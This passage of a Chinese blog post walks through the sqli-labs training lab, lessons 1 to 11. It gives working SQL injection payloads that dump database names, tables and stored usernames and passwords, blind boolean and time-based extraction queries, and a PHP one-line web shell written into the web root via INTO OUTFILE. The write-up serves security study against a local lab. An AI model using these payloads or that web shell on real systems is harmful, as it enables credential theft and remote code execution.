title="Less-7"></a>Less-7</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;%secure%&#39;;查看 secure-file-priv 当前的值，如果显示为NULL，则需要打开</span><br><span class="line">C:\phpstudy\PHPTutorial\MySQL\my.ini文件，在其中加上一句：secure_file_priv&#x3D;“&#x2F;”。</span><br><span class="line"></span><br><span class="line">一句话木马：php版本：&lt;?php @eval($_POST[“crow”]);?&gt; 其中crow是密码</span><br><span class="line">补充：</span><br><span class="line"></span><br><span class="line">load_file()  读取本地文件  select load_file(&#39;C:\\phpstudy\\PHPTutorial\\WWW\\sqli\\Less-7\\test.txt’);</span><br><span class="line"></span><br><span class="line">                                      </span><br><span class="line">into outfile 写文件                       </span><br><span class="line">用法： select &#39;mysql is very good&#39; into outfile &#39;test1.txt‘;</span><br><span class="line">文件位置： C:\phpstudy\PHPTutorial\MySQL\data</span><br><span class="line">                                      </span><br><span class="line">或者是select &#39;crow 666&#39; into outfile &#39;C:\\phpstudy\\PHPTutorial\\WWW\\sqli\\Less-7\\test.txt’;  </span><br><span class="line">文件位置： C:\phpstudy\PHPTutorial\WWW\sqli\Less-7</span><br><span class="line">注意事项： \\</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">IF(condition,A,B)如果条件condition为true，则执行语句A，否则执行B</span><br><span class="line"></span><br><span class="line">例： select if(1&gt;2,4,5);   返回的结果是5.（如果是在mysql命令行中使用，首先要use xxx数据库才行）</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2020/07/13/sqlo-labs/image-20200521234902356.png" alt="image-20200521234902356"></p><h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">参考资料：https:&#x2F;&#x2F;www.jb51.net&#x2F;article&#x2F;125599.htm</span><br><span class="line">                      https:&#x2F;&#x2F;www.jb51.net&#x2F;article&#x2F;125607.htm</span><br><span class="line">UPDATEXML (XML_document, XPath_string, new_value); </span><br><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc </span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 </span><br><span class="line">第三个参数：new_value，String格式，替换查找到的符合条件的数据 </span><br><span class="line">作用：改变文档中符合条件的节点的值</span><br><span class="line">改变XML_document中符合XPATH_string的值</span><br><span class="line">而我们的注入语句为：</span><br><span class="line"> select updatexml(1,concat(0x7e,(SELECT username from security.users limit 0,1),0x7e),1);</span><br><span class="line">其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~Dumb~&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Page-1"><a href="#Page-1" class="headerlink" title="Page-1"></a>Page-1</h1><h2 id="Less-1-GET-Error-based-Single-quotes-String"><a href="#Less-1-GET-Error-based-Single-quotes-String" class="headerlink" title="Less-1: GET-Error based-Single quotes-String"></a>Less-1: GET-Error based-Single quotes-String</h2><p><img src="/2020/07/13/sqlo-labs/image-20200521125907011.png" alt="image-20200521125907011"></p><p>注意此处的<code>id=-1</code>，就会不显示内容的，显示的是union后的内容</p><p><img src="/2020/07/13/sqlo-labs/image-20200521130407414.png" alt="image-20200521130407414"></p><p><img src="/2020/07/13/sqlo-labs/image-20200521130028770.png" alt="image-20200521130028770"></p><p>看到<strong>union</strong>是相同的列数，如果是不同的列数会报错的</p><p><img src="/2020/07/13/sqlo-labs/image-20200521130118926.png" alt="image-20200521130118926"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1’     查看是否有注入</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1‘ order by 3--+   查看有多少列</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;-1‘ union select 1,2,3--+ 查看哪些数据可以回显</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;-1‘ union select 1,2,database()--+  查看当前数据库</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;-1‘ union select 1,2,schema_name from information_schema.schemata limit 4,1--+  查看数据库security，通过修改4这个参数从0开始一个个的尝试</span><br><span class="line"></span><br><span class="line">或者是：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;-1’ union select 1,2,group_concat(schema_name) from information_schema.schemata--+ 查看所有的数据库</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;-1‘ union select 1,2,table_name from information_schema.tables where table_schema&#x3D;0x7365637572697479 limit 1,1--+ 查表，0x7365637572697479是库名</span><br><span class="line"></span><br><span class="line">或者是：http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;0x7365637572697479--+ 查看所有的</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;-1‘ union select 1,2,column_name from information_schema.columns where table_name&#x3D;0x7573657273--+ 查询列信息，或者是：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;0x7573657273--+ 查看所以的列信息</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;-1‘ union select 1,2,concat_ws(’~‘,username,password) from security.users limit 1,1--+ 查询一个账号和密码，</span><br><span class="line"></span><br><span class="line">或者是：http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;-1’ union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users --+ 直接可以得到所有的账号和密码，并且使用~符号进行分割。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Less2：GET-Error-based-Intiger-based"><a href="#Less2：GET-Error-based-Intiger-based" class="headerlink" title="Less2：GET-Error based-Intiger based"></a>Less2：GET-Error based-Intiger based</h2><p>可以将其中的一些符号进行十六进制话，例如<code>&#39;、~ 与名称（security等等）</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-2&#x2F;?id&#x3D;1’     查看是否有注入</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-2&#x2F;?id&#x3D;1 order by 3--+   查看有多少列</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;-1 union select 1,2,3--+ 查看哪些数据可以回显</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-2&#x2F;?id&#x3D;-1 union select 1,2,group_concat(schema_name) from information_schema.schemata --+ 查看所有数据库</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-2&#x2F;?id&#x3D;-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;0x7365637572697479 --+查看所有的表</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-2&#x2F;?id&#x3D;-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;0x7573657273 --+查看所有的列信息</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-2&#x2F;?id&#x3D;-1 union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users --+直接可以得到所有的账号和密码，并且使用~符号进行分割。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Less-3-GET-Error-based-Singer-quote-with-twist-string"><a href="#Less-3-GET-Error-based-Singer-quote-with-twist-string" class="headerlink" title="Less-3:GET-Error based-Singer quote with twist-string"></a>Less-3:GET-Error based-Singer quote with twist-string</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-3&#x2F;?id&#x3D;1’ 查看是否有注入</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-3&#x2F;?id&#x3D;1&#39;) order by 3--+ 查看有多少列</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-3&#x2F;?id&#x3D;-1&#39;) union select 1,2, group_concat(schema_name) from information_schema.schemata --+ 查看所有数据库</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-3&#x2F;?id&#x3D;-1&#39;) union select 1,2, group_concat(table_name) from information_schema.tables where table_schema&#x3D;0x7365637572697479 --+查看所有的表</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-3&#x2F;?id&#x3D;-1&#39;) union select 1,2, group_concat(column_name) from information_schema.columns where table_name&#x3D;0x7573657273 --+查看所有的列信息</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-3&#x2F;?id&#x3D;-1&#39;) union select 1,2, group_concat(concat_ws(0x7e,username,password)) from security.users --+直接可以得到所有的账号和密码，并且使用~符号进行分割</span><br></pre></td></tr></table></figure><p>成功的注入</p><p><code>&#39;) or &#39;1&#39;=(&#39;1 ) or 1=1 --+  </code></p><h2 id="Less-4-GET-Error-based-Double-Quotes-String"><a href="#Less-4-GET-Error-based-Double-Quotes-String" class="headerlink" title="Less -4 GET. Error based -Double Quotes -String"></a>Less -4 GET. Error based -Double Quotes -String</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-4&#x2F;?id&#x3D;1&quot;查看是否有注入</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-4&#x2F;?id&#x3D;1”) order by 3--+查看有多少列</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-4&#x2F;?id&#x3D;-1&quot;) union select 1,2, group_concat(schema_name) from information_schema.schemata --+查看所有数据库</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-4&#x2F;?id&#x3D;-1&quot;) union select 1,2, group_concat(table_name) from information_schema.tables where table_schema&#x3D;0x7365637572697479 --+查看所有的表</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-4&#x2F;?id&#x3D;-1&quot;) union select 1,2, group_concat(column_name) from information_schema.columns where table_name&#x3D;0x7573657273 --+查看所有的列信息</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-4&#x2F;?id&#x3D;-1&quot;) union select 1,2, group_concat(concat_ws(0x7e,username,password)) from security.users --+直接可以得到所有的账号和密码，并且使用~符号进行分割。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>有效的payload</p><p><code>“) or ”1”=(“1 “) or 1=1 --+  </code></p><h2 id="Less-5-：GET-Double-Injection-Single-Quotes-String"><a href="#Less-5-：GET-Double-Injection-Single-Quotes-String" class="headerlink" title="Less-5 ：GET-Double Injection-Single Quotes-String"></a>Less-5 ：GET-Double Injection-Single Quotes-String</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1’  查看是否有注入   </span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1‘ order by 3--+ 查看有多少列</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1‘ and left((select database()),1)&#x3D;’s’--+ 判断第一位是否是s，然后使用bp进行爆破处理：</span><br><span class="line">    </span><br><span class="line">GET &#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1%27%20and%20left((select%20database()),2)&#x3D;%27s§a§%27--+ HTTP&#x2F;1.1</span><br><span class="line">通过返回的长度来确定第二位是多少，最后确定为e，依次类推进行测试。</span><br><span class="line"></span><br><span class="line">或者是使用if来进行判断测试： http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1‘ and  ascii(substr((select database()),1,1))&gt;156--+（此时是没有返回的） （这种方法是错误的） 下图有解释</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1‘ and  ascii(substr((select database()),1,1))&gt;110--+  此时返回 you are in…….代表执行成功。</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2020/07/13/sqlo-labs/image-20200521191614438.png" alt="image-20200521191614438"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">完整注入流程：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1’ and  ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1)) &gt;100--+ 通过二分法猜解得到所有的库,红色为可变参数。</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1’ and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x7365637572697479 limit 1,1),1,1))&gt;1--+  再次通过二分法可猜解得到security下的所有表。其中，红色为可变参数。</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1’ and ascii(substr((select column_name from information_schema.columns where table_name&#x3D;0x7573657273 limit 1,1),1,1)) &gt;1 --+  通过二分法可猜解users内的字段，其中红色为可变参数。</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1’  and ascii(substr((select username from security.users limit 1,1),1,1))&gt;1--+继续猜解即可得到字段内的值。</span><br></pre></td></tr></table></figure><p><code>ascii(substr((select database()),1,1))&gt; 156 security</code><br>二分法<br>1，156<br>100</p><hr><p><a href="http://127.0.0.1/sqli/Less-5/?id=1&#39;">http://127.0.0.1/sqli/Less-5/?id=1&#39;</a><br>and<br> ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1)) &gt; 10<br> 99<br> –+ </p><p>Less-6：GET-Double Injection -Double Quotes -String</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">完整注入流程：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1” and  ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1)) &gt;100--+ 通过二分法猜解得到所有的库,红色为可变参数。</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1”and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x7365637572697479 limit 1,1),1,1))&gt;1--+  再次通过二分法可猜解得到security下的所有表。其中，红色为可变参数。</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1” and ascii(substr((select column_name from information_schema.columns where table_name&#x3D;0x7573657273 limit 1,1),1,1)) &gt;1 --+  通过二分法可猜解users内的字段，其中红色为可变参数。</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1”and ascii(substr((select username from security.users limit 1,1),1,1))&gt;1--+继续猜解即可得到字段内的值。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Less7-GET-Dump-into-outile-String"><a href="#Less7-GET-Dump-into-outile-String" class="headerlink" title="Less7-GET -Dump into outile -String"></a>Less7-GET -Dump into outile -String</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-7&#x2F;?id&#x3D;1‘)) order by 3--+ 查看有多少列</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-7&#x2F;?id&#x3D;-1‘)) union select 1,2,’&lt;?php @eval($_POST[“crow”]);?&gt;‘ into outfile “C:\\phpstudy\\PHPTutorial\\WWW\\sqli\\Less-7\\test.php” --+ 将一句话木马写入其中</span><br><span class="line"></span><br><span class="line">使用中国菜刀访问即可！</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Less8-GET-Blind-Boolian-Based-Single-Quotes"><a href="#Less8-GET-Blind-Boolian-Based-Single-Quotes" class="headerlink" title="Less8-GET - Blind - Boolian Based - Single Quotes"></a>Less8-GET - Blind - Boolian Based - Single Quotes</h2><p><code>http://www.sqli.com/Less-8/?id=1&#39; and if(ascii(substr(database(),1,1))=125,1,sleep(8)) --+</code></p><p><strong>法一：布尔盲注</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-8&#x2F;?id&#x3D;1’ 判断此时存在注入漏洞</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-8&#x2F;?id&#x3D;1‘ order by 3--+   当3改为4的时候，you are in….消失，说明存在三列。</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-8&#x2F;?id&#x3D;1‘ and left((select database()),1)&#x3D;0x73 --+ #猜出来当前第一位是s</span><br><span class="line">或者是使用： </span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-8&#x2F;?id&#x3D;1‘ and ascii(substr((select database()),1,1)) &gt; 16--+ 此时是有回显的。</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-8&#x2F;?id&#x3D;1‘ and ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1)) &gt;17 --+ 先通过大于号或者小于号来判断数据库的第一个字母是哪一个，</span><br><span class="line">也可以使用</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-8&#x2F;?id&#x3D;1’ and ascii(substr((select schema_name from information_schema.schemata limit 4,1),1,1)) &#x3D; 115--+ 此时可以验证数据库中第五个数据库的第一个字母是s</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-8&#x2F;?id&#x3D;1‘ and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x7365637572697479 limit 3,1),1,1)) &gt;11 --+ 判断security数据库中的第4个表中的数据的第一位是否大于11, </span><br><span class="line">也可以使用 </span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-8&#x2F;?id&#x3D;1’ and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x7365637572697479 limit 3,1),1,1)) &#x3D;117 --+ 验证数据库中第4个表中的数据的第一位的第一个字母的ascii码是否是117，也就是 u</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-8&#x2F;?id&#x3D;1‘ and  ascii(substr((select column_name from information_schema.columns where table_name &#x3D; 0x7573657273 limit 1,1),1,1)) &gt;10 --+ 同理，进行判断表中的字段，然后进行判断。可以得到username，password；</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-8&#x2F;?id&#x3D;1‘  and ascii(substr((select username from security.users limit 0,1),1,1)) &gt;10 --+ 同理，进行判断，最后再使用password进行判断。</span><br><span class="line"></span><br><span class="line">因为猜解速度较慢，可以配合burpsuite或者是sqlmap的脚本来使用</span><br></pre></td></tr></table></figure><p><strong>法二：时间盲注</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-8&#x2F;?id&#x3D;1‘ and sleep(5)--+ 使用延迟的方法判断是否存在注入漏洞。当然判断是否存在注入漏洞的方法很多。</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-8&#x2F;?id&#x3D;1‘ and if(length(database()) &#x3D; 8,1,sleep(5))--+ 当为8的时候很快加载，而为其他值得时候加载较慢（5s左右），那就说明此时数据库的长度就是8（security）</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-8&#x2F;?id&#x3D;1’ and if(ascii(substr((select database()),1,1)) &gt;113,1,sleep(5))--+如果当前数据库的第一个字母的ascii值大于113的时候，会立刻返回结果，否则执行5s。</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-8&#x2F;?id&#x3D;1‘ and if(ascii(substr((select schema_name from information_schema.schemata limit 4,1),1,1))&gt;112,1,sleep(5))--+ 同理判断数据库中的第5个数据库的第一位的ascii的值是不是大于112（实际中是115），如果是的则速度返回，否则延时5s返回结果。</span><br><span class="line"></span><br><span class="line">其余步骤与法一基本类似，可以采用burpsuite或者是sql盲注脚本使用。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Less-9：GET-Blind-Time-based-Single-Quotes"><a href="#Less-9：GET-Blind-Time-based-Single-Quotes" class="headerlink" title="Less-9：GET - Blind - Time based. - Single Quotes"></a>Less-9：GET - Blind - Time based. - Single Quotes</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-9&#x2F;?id&#x3D;1‘  order by 3999--+ 当使用order by的时候，此时无论如何都是回显you are in….所以无法使用order by进行判断。</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-9&#x2F;?id&#x3D;1‘ and sleep(5)--+ 当存在注入漏洞时，可以使用延迟注入进行判断，此时若存在漏洞，则睡眠5s之后再返回结果。</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-9&#x2F;?id&#x3D;1‘ and if(length(database())&#x3D;8,1,sleep(5)); 通过返回时间进行判断，此时如果数据库长度为8，则可以较快返回。</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-9&#x2F;?id&#x3D;1‘ and if(ascii(substr((select schema_name from information_schema.schemata limit 4,1),1,1))&gt;1112,1,sleep(5))--+ 使用less-8中同样的方法进行判断即可!</span><br><span class="line"></span><br><span class="line">因为盲注属于猜解，推荐使用脚本进行操作。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Less-10-GET-Blind-Time-based-double-quotes"><a href="#Less-10-GET-Blind-Time-based-double-quotes" class="headerlink" title="Less-10:GET-Blind - Time based -double quotes"></a>Less-10:GET-Blind - Time based -double quotes</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-10&#x2F;?id&#x3D;1“ and sleep(11)--+ 只是将less-9中的单引号换成了双引号，其余的均相同</span><br></pre></td></tr></table></figure><h2 id="Less-11-：POST-Error-Based-Single-quotes-String"><a href="#Less-11-：POST-Error-Based-Single-quotes-String" class="headerlink" title="Less-11 ：POST -Error Based - Single quotes- String"></a>Less-11 ：POST -Error Based - Single quotes- String</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">对于POST关卡，我们需要使用burpsuite进行配合操作</span><br><span class="line">同样在代码中加入两行：</span><br><span class="line">        <span class="keyword">echo</span> $sql;</span><br><span class="line">        <span class="keyword">echo</span> <span 